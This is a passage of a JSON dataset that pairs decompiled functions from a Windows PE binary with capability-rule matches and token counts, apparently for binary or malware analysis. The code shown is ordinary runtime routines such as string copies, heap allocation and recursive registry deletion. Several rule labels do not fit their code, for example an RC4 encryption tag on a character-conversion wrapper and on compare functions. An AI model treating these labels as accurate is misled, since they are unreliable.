        "decompiled_code": "\nvoid __cdecl fcn.00446e5b(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[2] = arg_18h;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[0x10f] = 0;\n    in_ECX[0x110] = 0;\n    in_ECX[5] = 0;\n    *(in_ECX + 6) = 0;\n    in_ECX[7] = 0;\n    in_ECX[8] = 0;\n    in_ECX[9] = 0;\n    *(in_ECX + 0xb) = 0;\n    in_ECX[0xd] = 0;\n    *(in_ECX + 0xe) = 0;\n    in_ECX[0x112] = *arg_8h;\n    *in_ECX = arg_ch;\n    in_ECX[3] = arg_14h;\n    in_ECX[4] = arg_1ch;\n    in_ECX[1] = arg_10h;\n    return;\n}\n",
        "token_count": 303
    },
    "00446ec2": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446ec2(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[2] = arg_18h;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[0x10f] = 0;\n    in_ECX[0x110] = 0;\n    in_ECX[5] = 0;\n    *(in_ECX + 6) = 0;\n    in_ECX[7] = 0;\n    in_ECX[8] = 0;\n    in_ECX[9] = 0;\n    *(in_ECX + 0xb) = 0;\n    in_ECX[0xd] = 0;\n    *(in_ECX + 0xe) = 0;\n    in_ECX[0x112] = *arg_8h;\n    *in_ECX = arg_ch;\n    in_ECX[3] = arg_14h;\n    in_ECX[4] = arg_1ch;\n    in_ECX[1] = arg_10h;\n    return;\n}\n",
        "token_count": 302
    },
    "00446f29": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446f29(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[2] = arg_18h;\n    *(in_ECX + 0x2e) = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[0x10f] = 0;\n    in_ECX[0x110] = 0;\n    in_ECX[5] = 0;\n    *(in_ECX + 6) = 0;\n    in_ECX[7] = 0;\n    in_ECX[8] = 0;\n    in_ECX[9] = 0;\n    *(in_ECX + 0xb) = 0;\n    in_ECX[0xd] = 0;\n    *(in_ECX + 0xe) = 0;\n    in_ECX[0x112] = *arg_8h;\n    *in_ECX = arg_ch;\n    in_ECX[3] = arg_14h;\n    in_ECX[4] = arg_1ch;\n    in_ECX[1] = arg_10h;\n    return;\n}\n",
        "token_count": 318
    },
    "00446f95": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446f95(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[2] = arg_18h;\n    *(in_ECX + 0x2e) = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[0x10f] = 0;\n    in_ECX[0x110] = 0;\n    in_ECX[5] = 0;\n    *(in_ECX + 6) = 0;\n    in_ECX[7] = 0;\n    in_ECX[8] = 0;\n    in_ECX[9] = 0;\n    *(in_ECX + 0xb) = 0;\n    in_ECX[0xd] = 0;\n    *(in_ECX + 0xe) = 0;\n    in_ECX[0x112] = *arg_8h;\n    *in_ECX = arg_ch;\n    in_ECX[3] = arg_14h;\n    in_ECX[4] = arg_1ch;\n    in_ECX[1] = arg_10h;\n    return;\n}\n",
        "token_count": 318
    },
    "0042eebb": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "print debug messages"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.0042eebb(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    fcn.0042ef32();\n    *param_1 = 0x38;\n    param_1[2] = 0x400000;\n    param_1[1] = 0x400000;\n    param_1[3] = 0xe00;\n    param_1[4] = 0x47ce10;\n    iVar1 = fcn.0042f0a9();\n    if (iVar1 < 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n        if (iVar1 != 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringW)\n                      (L\"ERROR : Unable to initialize critical section in CAtlBaseModule\\n\");\n        }\n        *0x6cc6f8 = 1;\n    }\n    return param_1;\n}\n",
        "token_count": 209
    },
    "0043b732": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b732(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint uVar2;\n    \n    *(in_ECX + 5) = 0;\n    *in_ECX = 0;\n    *(in_ECX + 2) = 0;\n    *(in_ECX + 7) = 0;\n    *(in_ECX + 9) = 0;\n    if (arg_8h == NULL) {\n        uVar1 = *0x6caf00;\n        uVar2 = *0x6caf04;\n        if (*0x6cd5fc != 0) {\n            return;\n        }\n    }\n    else {\n        uVar1 = *arg_8h;\n        uVar2 = arg_8h[1];\n    }\n    *(in_ECX + 5) = 1;\n    in_ECX[4] = uVar2;\n    in_ECX[3] = uVar1;\n    return;\n}\n",
        "token_count": 225
    },
    "00463192": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00463192(int32_t arg_8h, uint arg_ch, uint lpWideCharStr, uint arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h\n            , uint *arg_24h)\n\n{\n    bool bVar1;\n    ulong uVar2;\n    \n    if ((arg_8h == 65000) || (arg_8h == 0xfde9)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    uVar2 = fcn.00463102(arg_8h, arg_ch);\n    if ((bVar1) && (arg_24h != NULL)) {\n        *arg_24h = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n              (uVar2 >> 0x20, uVar2, lpWideCharStr, arg_14h, arg_18h, arg_1ch, ~-bVar1 & arg_20h, ~-bVar1 & arg_24h);\n    return;\n}\n",
        "token_count": 249
    },
    "00477256": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00477256(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (*arg_8h == *arg_ch) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = (*arg_8h & 0xff) - *arg_ch;\n        if (iVar1 != 0) {\n            iVar1 = (0 < iVar1) * 2 + -1;\n        }\n        if (iVar1 == 0) {\n            iVar1 = *(arg_8h + 1) - *(arg_ch + 1);\n            if (iVar1 != 0) {\n                iVar1 = (0 < iVar1) * 2 + -1;\n            }\n            if (iVar1 == 0) {\n                iVar1 = *(arg_8h + 2) - *(arg_ch + 2);\n                if (iVar1 != 0) {\n                    iVar1 = (0 < iVar1) * 2 + -1;\n                }\n                if ((iVar1 == 0) && (iVar1 = *(arg_8h + 3) - *(arg_ch + 3),  iVar1 != 0)) {\n                    iVar1 = (0 < iVar1) * 2 + -1;\n                }\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 300
    },
    "004772fd": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004772fd(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if (*arg_8h == *arg_ch) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = (*arg_8h & 0xff) - *arg_ch;\n        if (iVar1 != 0) {\n            iVar1 = (0 < iVar1) * 2 + -1;\n        }\n        if ((iVar1 == 0) && (iVar1 = *(arg_8h + 1) - *(arg_ch + 1),  iVar1 != 0)) {\n            iVar1 = (0 < iVar1) * 2 + -1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 176
    },
    "0040bf70": {
        "rules": [
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bf70(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *in_ECX;\n    uint32_t arg_8h_00;\n    uint var_228h;\n    uint var_220h;\n    uint var_21ch;\n    int32_t var_218h;\n    uint var_214h;\n    int32_t var_210h;\n    uint32_t var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_210h = 0;\n    uVar1 = in_ECX[1];\n    arg_8h_00 = uVar1 | 0x2001f;\n    var_21ch = arg_8h;\n    var_20ch = 0;\n    var_208h = 0;\n    var_218h = 0;\n    iVar4 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(*in_ECX, arg_8h, 0, arg_8h_00, &var_218h);\n    pcVar2 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (iVar4 == 0) {\n        iVar4 = 0;\n        if (var_210h != 0) {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_210h);\n        }\n        pcVar3 = _sym.imp.ADVAPI32.dll_RegEnumKeyExW;\n        var_20ch = uVar1 & 0x300;\n        var_210h = var_218h;\n        if (iVar4 == 0) {\n            var_214h = 0x100;\n            iVar4 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyExW)(var_218h, 0, &var_204h, &var_214h, 0, 0, 0, &var_228h);\n            while (iVar4 == 0) {\n                iVar4 = fcn.0040bf70(&var_204h);\n                if (iVar4 != 0) goto code_r0x0040c0d1;\n                var_214h = 0x100;\n                iVar4 = (*pcVar3)(var_210h, 0, &var_204h, &var_214h, 0, 0, 0, &var_228h);\n            }\n            if (var_210h != 0) {\n                (*pcVar2)(var_210h);\n                var_210h = 0;\n            }\n            var_20ch = 0;\n            fcn.00403cf0(var_21ch);\n        }\n    }\ncode_r0x0040c0d1:\n    if (var_210h != 0) {\n        (*pcVar2)(var_210h);\n    }\n    fcn.004303e9(arg_8h_00);\n    return;\n}\n",
        "token_count": 694
    },
    "00460c23": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint32_t fcn.00460c23(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    return *(*(*(*(in_FS_OFFSET + 0x18) + 0x30) + 0x10) + 8) >> 0x1f;\n}\n",
        "token_count": 61
    },
    "00474612": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00474612(void)\n\n{\n    *0x6cb690 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 62
    },
    "00405c00": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405c00(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint lpCriticalSection;\n    \n    if (param_1 == 0) {\n        return 0;\n    }\n    iVar1 = param_1 + 4;\n    uVar5 = 0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar1);\n    puVar6 = *(param_1 + 0x1c);\n    if (puVar6 != NULL) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        puVar4 = NULL;\n        while (puVar6[1] != iVar3) {\n            piVar2 = puVar6 + 2;\n            puVar4 = puVar6;\n            puVar6 = *piVar2;\n            if (*piVar2 == NULL) {\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n                return 0;\n            }\n        }\n        if (puVar4 == NULL) {\n            *(param_1 + 0x1c) = puVar6[2];\n            uVar5 = *puVar6;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n            return uVar5;\n        }\n        puVar4[2] = puVar6[2];\n        uVar5 = *puVar6;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n    return uVar5;\n}\n",
        "token_count": 361
    },
    "0042e8b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042e8b0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0042e920();\n    if ((iVar1 != 0) && (uVar2 = 0,  *0x6c9e30 != 0)) {\n        do {\n            if (arg_8h == *(uVar2 * 8 + 0x6c9e34)) {\n                return uVar2;\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *0x6c9e30);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 159
    },
    "0042f170": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042f170(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    int32_t arg_8h_00;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 0x14);\n    uVar3 = 0;\n    arg_8h_00 = 0;\n    if (0 < *(in_ECX + 0x30)) {\n        do {\n            piVar1 = fcn.0042ef92(arg_8h_00);\n            if (*piVar1 == arg_8h) {\n                fcn.0042f128(arg_8h_00);\n                uVar3 = 1;\n                break;\n            }\n            arg_8h_00 = arg_8h_00 + 1;\n        } while (arg_8h_00 < *(in_ECX + 0x30));\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 0x14);\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 283
    },
    "004329a0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004329a0(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (param_1 < 0xffffffe1) {\n        if (param_1 == 0) {\n            param_1 = 1;\n        }\n        do {\n            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x6cdab0, 0, param_1);\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar1 = fcn.0045ab4d();\n        } while ((iVar1 != 0) && (iVar1 = fcn.0045661d(param_1),  iVar1 != 0));\n    }\n    puVar2 = fcn.0043bcb5();\n    *puVar2 = 0xc;\n    return 0;\n}\n",
        "token_count": 197
    },
    "00433f13": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00433f13(uint8_t *param_1, uint8_t *param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint uVar6;\n    bool bVar7;\n    \n    iVar2 = *(param_1 + 4);\n    if (((iVar2 == 0) || (puVar5 = iVar2 + 8,  *puVar5 == 0)) || (((*param_1 & 0x80) != 0 && ((*param_2 & 0x10) != 0))))\n    {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n        if (iVar2 != *(param_2 + 4)) {\n            puVar3 = *(param_2 + 4) + 8;\n            do {\n                uVar1 = *puVar5;\n                bVar7 = uVar1 < *puVar3;\n                if (uVar1 != *puVar3) {\ncode_r0x0043383b:\n                    uVar4 = -bVar7 | 1;\n                    goto code_r0x00433840;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar7 = uVar1 < puVar3[1];\n                if (uVar1 != puVar3[1]) goto code_r0x0043383b;\n                puVar5 = puVar5 + 2;\n                puVar3 = puVar3 + 2;\n            } while (uVar1 != 0);\n            uVar4 = 0;\ncode_r0x00433840:\n            if (uVar4 != 0) {\n                return 0;\n            }\n        }\n        if ((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&\n           ((((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)) && (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))))) {\n            uVar6 = 1;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 523
    },
    "00433fb9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00433fb9(uint8_t *param_1, uint8_t *param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint uVar6;\n    bool bVar7;\n    \n    iVar2 = *(param_1 + 4);\n    if (((iVar2 == 0) || (puVar5 = iVar2 + 8,  *puVar5 == 0)) || (((*param_1 & 0x80) != 0 && ((*param_2 & 0x10) != 0))))\n    {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n        if (iVar2 != *(param_2 + 4)) {\n            puVar3 = *(param_2 + 4) + 8;\n            do {\n                uVar1 = *puVar5;\n                bVar7 = uVar1 < *puVar3;\n                if (uVar1 != *puVar3) {\ncode_r0x0043383b:\n                    uVar4 = -bVar7 | 1;\n                    goto code_r0x00433840;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar7 = uVar1 < puVar3[1];\n                if (uVar1 != puVar3[1]) goto code_r0x0043383b;\n                puVar5 = puVar5 + 2;\n                puVar3 = puVar3 + 2;\n            } while (uVar1 != 0);\n            uVar4 = 0;\ncode_r0x00433840:\n            if (uVar4 != 0) {\n                return 0;\n            }\n        }\n        if ((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&\n           ((((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)) && (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))))) {\n            uVar6 = 1;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 523
    },
    "0043bdf2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043bdf2(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != 0) {\n            piVar3 = arg_8h;\n            do {\n                iVar1 = *((arg_10h - arg_8h) + piVar3);\n                *piVar3 = iVar1;\n                piVar3 = piVar3 + 1;\n                if (iVar1 == 0) {\n                    return 0;\n                }\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            *arg_8h = 0;\n            puVar2 = fcn.0043bcb5();\n            uStack16 = 0x22;\n            goto code_r0x0043be1a;\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.0043bcb5();\n    uStack16 = 0x16;\ncode_r0x0043be1a:\n    *puVar2 = uStack16;\n    fcn.0043bb3e();\n    return uStack16;\n}\n",
        "token_count": 309
    },
    "0043be56": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043be56(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != 0) {\n            piVar3 = arg_8h;\n            do {\n                iVar1 = *((arg_10h - arg_8h) + piVar3);\n                *piVar3 = iVar1;\n                piVar3 = piVar3 + 1;\n                if (iVar1 == 0) {\n                    return 0;\n                }\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            *arg_8h = 0;\n            puVar2 = fcn.0043bcb5();\n            uStack16 = 0x22;\n            goto code_r0x0043be7e;\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.0043bcb5();\n    uStack16 = 0x16;\ncode_r0x0043be7e:\n    *puVar2 = uStack16;\n    fcn.0043bb3e();\n    return uStack16;\n}\n",
        "token_count": 308
    },
    "00447b34": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447b34(char *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    \n    cVar1 = *arg_8h;\n    while ((cVar1 != '\\0' && (cVar1 != ***(*arg_ch + 0x88)))) {\n        arg_8h = arg_8h + 1;\n        cVar1 = *arg_8h;\n    }\n    if (cVar1 != '\\0') {\n        do {\n            arg_8h = arg_8h + 1;\n            cVar1 = *arg_8h;\n            pcVar2 = arg_8h;\n            if ((cVar1 == '\\0') || (cVar1 == 'e')) break;\n        } while (cVar1 != 'E');\n        do {\n            pcVar3 = pcVar2;\n            pcVar2 = pcVar3 + -1;\n        } while (*pcVar2 == '0');\n        if (*pcVar2 == ***(*arg_ch + 0x88)) {\n            pcVar2 = pcVar3 + -2;\n        }\n        do {\n            cVar1 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            pcVar2 = pcVar2 + 1;\n            *pcVar2 = cVar1;\n        } while (cVar1 != '\\0');\n    }\n    return;\n}\n",
        "token_count": 327
    },
    "00457471": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.00457471(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    char **ppcVar7;\n    char **ppcVar8;\n    char **ppcStack36;\n    char **ppcStack32;\n    uint uStack28;\n    int32_t iStack24;\n    char *pcStack20;\n    char *pcStack16;\n    char *pcStack12;\n    uint uStack8;\n    \n    if (param_2 == NULL) {\n        puVar3 = fcn.0043bcb5();\n        iVar6 = 0x16;\n        *puVar3 = 0x16;\n        fcn.0043bb3e();\n    }\n    else {\n        *param_2 = 0;\n        uStack28 = 0;\n        ppcStack32 = NULL;\n        ppcStack36 = NULL;\n        iVar6 = *param_1;\n        ppcVar8 = ppcStack36;\n        while (ppcStack36 = ppcVar8,  iVar6 != 0) {\n            uStack8 = CONCAT13(uStack8 >> 0x18, 0x3f2a);\n            iVar6 = fcn.0046e110(iVar6, &uStack8);\n            if (iVar6 == 0) {\n                iVar6 = fcn.0046143d(*param_1, 0, 0, &ppcStack36);\n            }\n            else {\n                iVar6 = fcn.004615a2(*param_1, iVar6, &ppcStack36);\n            }\n            if (iVar6 != 0) goto code_r0x004611ef;\n            param_1 = param_1 + 1;\n            ppcVar8 = ppcStack36;\n            iVar6 = *param_1;\n        }\n        iVar6 = (ppcStack32 - ppcVar8 >> 2) + 1;\n        pcStack12 = NULL;\n        for (ppcVar7 = ppcVar8; ppcVar7 != ppcStack32; ppcVar7 = ppcVar7 + 1) {\n            pcVar5 = *ppcVar7;\n            pcStack16 = pcVar5 + 1;\n            do {\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            pcStack12 = pcVar5 + pcStack12 + (1 - pcStack16);\n        }\n        iVar4 = fcn.00457505(iVar6, pcStack12, 1);\n        ppcVar7 = ppcStack32;\n        if (iVar4 == 0) {\n            fcn.0045d185(0);\n            iVar6 = -1;\ncode_r0x004611ef:\n            fcn.00461bca();\n        }\n        else {\n            uStack8 = iVar4 + iVar6 * 4;\n            pcStack20 = uStack8;\n            if (ppcVar8 != ppcStack32) {\n                iStack24 = iVar4 - ppcVar8;\n                do {\n                    pcStack16 = *ppcVar8;\n                    pcVar5 = pcStack16 + 1;\n                    do {\n                        cVar1 = *pcStack16;\n                        pcStack16 = pcStack16 + 1;\n                    } while (cVar1 != '\\0');\n                    pcStack16 = pcStack16 + (1 - pcVar5);\n                    iVar6 = fcn.0043c04a(uStack8, pcStack12 + (pcStack20 - uStack8), *ppcVar8, pcStack16);\n                    if (iVar6 != 0) {\n                        fcn.0043bb6b(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        iVar6 = (*pcVar2)();\n                        return iVar6;\n                    }\n                    *(iStack24 + ppcVar8) = uStack8;\n                    ppcVar8 = ppcVar8 + 1;\n                    uStack8 = uStack8 + pcStack16;\n                } while (ppcVar8 != ppcVar7);\n            }\n            *param_2 = iVar4;\n            fcn.0045d185(0);\n            fcn.00461bca();\n            iVar6 = 0;\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 1011
    },
    "0045747c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045747c(int32_t *param_1, int32_t *param_2)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    int16_t *piVar8;\n    int16_t **ppiVar9;\n    int16_t **ppiVar10;\n    int16_t **ppiStack40;\n    int16_t **ppiStack36;\n    uint uStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int16_t *piStack20;\n    int32_t iStack16;\n    ushort uStack12;\n    uint32_t uStack8;\n    \n    uStack8 = *0x6cade0 ^ &stack0xfffffffc;\n    if (param_2 == NULL) {\n        puVar4 = fcn.0043bcb5();\n        *puVar4 = 0x16;\n        fcn.0043bb3e();\n    }\n    else {\n        *param_2 = 0;\n        iVar5 = *param_1;\n        ppiStack40 = NULL;\n        ppiStack36 = NULL;\n        uStack32 = 0;\n        ppiVar10 = ppiStack40;\n        while (ppiStack40 = ppiVar10,  iVar5 != 0) {\n            iStack16 = 0x3f002a;\n            uStack12 = 0;\n            iVar5 = fcn.004666e0(iVar5, &iStack16);\n            if (iVar5 == 0) {\n                iVar5 = fcn.004614ee(*param_1, 0, 0, &ppiStack40);\n            }\n            else {\n                iVar5 = fcn.00461827(*param_1, iVar5, &ppiStack40);\n            }\n            if (iVar5 != 0) goto code_r0x0046138c;\n            param_1 = param_1 + 1;\n            ppiVar10 = ppiStack40;\n            iVar5 = *param_1;\n        }\n        iVar5 = (ppiStack36 - ppiVar10 >> 2) + 1;\n        iStack24 = 0;\n        for (ppiVar9 = ppiVar10; ppiVar9 != ppiStack36; ppiVar9 = ppiVar9 + 1) {\n            piVar7 = *ppiVar9;\n            piStack20 = piVar7 + 1;\n            do {\n                iVar2 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar2 != 0);\n            iStack24 = iStack24 + 1 + (piVar7 - piStack20 >> 1);\n        }\n        iVar6 = fcn.00457505(iVar5, iStack24, 2);\n        ppiVar9 = ppiStack36;\n        if (iVar6 == 0) {\n            fcn.0045d185(0);\ncode_r0x0046138c:\n            fcn.00461bef();\n        }\n        else {\n            piVar7 = iVar6 + iVar5 * 4;\n            piStack20 = piVar7;\n            if (ppiVar10 != ppiStack36) {\n                iStack16 = iVar6 - ppiVar10;\n                do {\n                    piVar8 = *ppiVar10;\n                    piVar1 = piVar8 + 1;\n                    do {\n                        iVar2 = *piVar8;\n                        piVar8 = piVar8 + 1;\n                    } while (iVar2 != 0);\n                    iStack28 = (piVar8 - piVar1 >> 1) + 1;\n                    iVar5 = fcn.0043bf88(piStack20, iStack24 - (piStack20 - piVar7 >> 1), *ppiVar10, iStack28);\n                    if (iVar5 != 0) {\n                        fcn.0043bb6b(0, 0, 0, 0, 0);\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                    *(iStack16 + ppiVar10) = piStack20;\n                    ppiVar10 = ppiVar10 + 1;\n                    piStack20 = piStack20 + iStack28;\n                } while (ppiVar10 != ppiVar9);\n            }\n            *param_2 = iVar6;\n            fcn.0045d185(0);\n            fcn.00461bef();\n        }\n    }\n    fcn.004303e9(param_2);\n    return;\n}\n",
        "token_count": 1037
    },
    "0045ac6c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045ac6c(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    char *pcVar3;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != 0) {\n            pcVar3 = arg_8h;\n            do {\n                cVar1 = pcVar3[arg_10h - arg_8h];\n                *pcVar3 = cVar1;\n                pcVar3 = pcVar3 + 1;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            *arg_8h = '\\0';\n            puVar2 = fcn.0043bcb5();\n            uStack16 = 0x22;\n            goto code_r0x0045ac92;\n        }\n        *arg_8h = '\\0';\n    }\n    puVar2 = fcn.0043bcb5();\n    uStack16 = 0x16;\ncode_r0x0045ac92:\n    *puVar2 = uStack16;\n    fcn.0043bb3e();\n    return uStack16;\n}\n",
        "token_count": 302
    },
    "0045acc6": {
        "rules": [
            "contain loop"
        ],
